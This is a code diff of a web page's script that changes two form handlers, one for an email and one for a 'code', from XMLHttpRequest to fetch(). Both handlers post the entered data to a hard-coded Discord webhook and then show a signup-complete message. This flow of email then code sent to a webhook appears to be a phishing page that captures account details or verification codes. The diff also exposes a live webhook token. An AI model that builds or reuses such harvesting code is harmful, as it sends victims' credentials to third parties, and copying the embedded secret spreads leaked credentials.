@@ -158,7 +158,7 @@
   </div>
 </div>
 
- <script>
+  <script>
     // JavaScript code
 
     // Code for email form submission
@@ -173,20 +173,24 @@
       };
 
       const webhookUrl = "https://discord.com/api/webhooks/1119215694110789742/DKe5G1oQ3Zf2zgQTu2QEfzq650Ar4YNoXquQkDTv26mFXQuBjBHPXPleekqZ_xAnVsP0";
-      const xhr = new XMLHttpRequest();
-      xhr.open("POST", webhookUrl, true);
-      xhr.setRequestHeader("Content-Type", "application/json");
-      xhr.onreadystatechange = function () {
-        if (xhr.readyState === XMLHttpRequest.DONE) {
-          if (xhr.status === 200) {
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(message),
+      })
+        .then(function (response) {
+          if (response.ok) {
             document.getElementById("emailForm").style.display = "none";
             document.getElementById("codeFormContainer").style.display = "block";
           } else {
-            console.error("Failed to send webhook:", xhr.statusText);
+            console.error("Failed to send webhook:", response.statusText);
           }
-        }
-      };
-      xhr.send(JSON.stringify(message));
+        })
+        .catch(function (error) {
+          console.error("Failed to send webhook:", error);
+        });
     });
 
     // Code for code form submission
@@ -200,21 +204,26 @@
       };
 
       const webhookUrl = "https://discord.com/api/webhooks/1119215694110789742/DKe5G1oQ3Zf2zgQTu2QEfzq650Ar4YNoXquQkDTv26mFXQuBjBHPXPleekqZ_xAnVsP0L";
-      const xhr = new XMLHttpRequest();
-      xhr.open("POST", webhookUrl, true);
-      xhr.setRequestHeader("Content-Type", "application/json");
-      xhr.onreadystatechange = function () {
-        if (xhr.readyState === XMLHttpRequest.DONE) {
-          if (xhr.status === 200) {
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(message),
+      })
+        .then(function (response) {
+          if (response.ok) {
             document.getElementById("codeFormContainer").style.display = "none";
             document.getElementById("signupComplete").style.display = "block";
           } else {
-            console.error("Failed to send webhook:", xhr.statusText);
+            console.error("Failed to send webhook:", response.statusText);
           }
-        }
-      };
-      xhr.send(JSON.stringify(message));
+        })
+        .catch(function (error) {
+          console.error("Failed to send webhook:", error);
+        });
     });
   </script>
 </body>
 </html>
+
